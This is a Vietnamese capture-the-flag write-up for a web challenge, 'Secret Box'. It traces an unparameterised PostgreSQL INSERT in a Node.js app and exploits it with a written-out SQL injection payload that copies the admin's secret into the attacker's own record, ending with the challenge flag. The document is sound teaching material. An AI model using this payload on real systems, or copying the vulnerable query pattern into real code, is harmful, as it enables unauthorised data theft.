# Secret Box

![image.png](Secret%20Box/image.png)

Đây là 1 bài white-box nên mình chỉ nhìn qua web rồi tiến hành vào đọc mã nguồn mà bài cấp

Đầu tiên trong `db.js`  

```sql
const db = knex({
	client: 'pg',
	connection: {
		host: process.env.DB_HOST,
		port: process.env.DB_PORT,
		user: process.env.DB_USER,
		password: process.env.DB_PASSWORD,
		database: process.env.DB_NAME,
	},
	pool: {min: 0, max: 5},
});
```

`client: 'pg'` nghĩa là sử dụng PostgreSQL 

```sql
await db('secrets')
  .where({
    owner_id: 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb'
  })
  .update({ content: process.env.FLAG });
```

Mọi người có thể thấy flag được lưu vào trong cột`content` của bảng `secrets` ứng với id thuộc tài khoản admin 

Tiếp trong server.js

```sql
const content = req.body.content;
	const query = await db.raw(
		`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')` 
	);
```

Ở đây đoạn mã tạo `secret` mới có điểm khác biệt là nó trực tiếp truyền dữ liệu người dùng nhập vào câu lệnh SQL thay vì truyền qua tham số như 1 chức năng trên 

```sql
const userResult = await db.raw(
    `SELECT * FROM users WHERE username = ? AND password = ? LIMIT 1`,
    [username, password]
);
```

Ví dụ như trong  chức năng đăng nhập đã sử dùng`?` để truyền tham số, do đó hướng tiếp theo mình sẽ đi sâu vào khai thác chức năng tạo `secret` 

Vì dữ liệu chúng ta nhập vào trường `content` được nối trực tiếp vào câu lệnh SQL, nên mình sẽ thử chèn thêm cú pháp SQL để thay đổi biểu thức ban đầu. Thay vì chỉ lưu nội dung do người dùng nhập, mình sẽ tìm cách khiến PostgreSQL thực hiện một truy vấn con để lấy nội dung secret của admin rồi lưu kết quả vào secret của mình.

Hướng khai thác tiếp theo thì mình sẽ dùng toán tử nối chuỗi và truy vấn con để khai thác

```sql
a+' || (
        SELECT secrets.content
        FROM users
        JOIN secrets ON users.id = secrets.owner_id
        WHERE users.username = 'admin'
    ))-- 
```

Đoạn mã này sẽ lấy phần nội dung trong bảng`secrets` của người dùng `admin` và nối vào với với chuỗi `“a+”` 

Sau khi ghép thì câu SQL hoàn chỉnh sẽ thành 

```sql
INSERT INTO secrets(owner_id, content)
VALUES (
    'user123',
    'a+' || (
        SELECT secrets.content
        FROM users
        JOIN secrets ON users.id = secrets.owner_id
        WHERE users.username = 'admin'
    )
)--')
```

Ở đây, câu lệnh `INSERT` vẫn giữ nguyên `owner_id` là ID của tài khoản mình đang đăng nhập, nhưng giá trị `content` đã được thay đổi thành chuỗi `a+` nối với nội dung `secret` của admin thông qua truy vấn con.

Trong `server.js`, khi truy cập trang chủ, ứng dụng sẽ lấy các `secret` có `owner_id` trùng với ID của người dùng đang đăng nhập:

```
const query = await db.raw(
    `SELECT * FROM secrets WHERE owner_id = ?`,
    [userId]
);
```

Như vậy, mặc dù nội dung được lấy từ `secret` của admin nhưng bản ghi mới vẫn thuộc tài khoản của mình. Do đó, khi quay lại trang chủ, ứng dụng sẽ hiển thị `secret` vừa tạo có chứa flag.

Giờ mình sẽ tạo 1 tài khoản và truy cập vào chức năng tạo `secret`

![image.png](Secret%20Box/image%201.png)

Truyền `payload` vào ô `Content` và `Submit`

![image.png](Secret%20Box/image%202.png)

Mình đã lấy được flag

`academy{sq1_1nject10n_a6e12f86}`